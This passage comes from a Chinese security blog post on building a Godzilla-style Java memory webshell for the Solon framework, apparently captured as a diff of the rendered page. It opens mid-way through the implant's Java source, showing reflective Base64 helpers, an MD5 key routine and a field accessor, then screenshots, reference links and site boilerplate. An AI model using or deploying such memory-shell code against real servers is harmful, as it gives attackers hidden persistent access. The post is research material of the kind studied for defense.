class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-comment">// Base64解码</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] base64Decode(String bs) <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; base64;<br>        <span class="hljs-type">byte</span>[] value = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-comment">// MD5计算</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">md5</span><span class="hljs-params">(String s)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            java.security.MessageDigest m;<br>            m = java.security.MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>            m.update(s.getBytes(), <span class="hljs-number">0</span>, s.length());<br>            ret = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.math.BigInteger(<span class="hljs-number">1</span>, m.digest()).toString(<span class="hljs-number">16</span>).toUpperCase();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getfieldobj</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> field.get(obj);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getSuperclass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> field.get(obj);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2025/04/image-20250421163636428.png" srcset="/img/loading.gif" lazyload alt="image-20250421163636428"></p>
+<p><img src="https://image.sp4rks.xyz/2025/04/image-20250421163726807.png" srcset="/img/loading.gif" lazyload alt="image-20250421163726807"></p>
+<p>对下面的话理解的更深了，只能说哥斯拉YYDS。</p>
+<p><img src="https://image.sp4rks.xyz/2025/04/image-20250421163759698.png" srcset="/img/loading.gif" lazyload alt="image-20250421163759698"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://github.com/7rovu/java-object-searcher">java-object-searcher</a></p>
+<p><a target="_blank" rel="noopener" href="https://h3rmesk1t.github.io/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/">Solon框架内存马</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.qshu1.com/2024/09/13/Solon%E6%A1%86%E6%9E%B6%E8%9A%81%E5%89%91%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/">Solon框架蚁剑内存马实现</a></p>
+<p><a target="_blank" rel="noopener" href="https://jkme.github.io/2022/05/17/godzilla.html">哥斯拉原理分析</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/JAVA/" class="category-chain-item">JAVA</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#JAVA内存马</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Solon 哥斯拉内存马(最适合年轻人的第一个内存马)</div>
+      <div>https://sp4rks3.github.io/2025/04/21/JAVA安全/内存马/Solon内存马分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sp4rks3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/19/JAVA%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Metabase%20RCE%20%E5%88%86%E6%9E%90/" title="Metabase RCE分析及内存马构造">
+                        <span class="hidden-mobile">Metabase RCE分析及内存马构造</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"Sp4rks3/Sp4rks3.github.io","repo-id":"R_kgDOL2R4Xw","category":"Announcements","category-id":"DIC_kwDOL2R4X84ChqtT","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
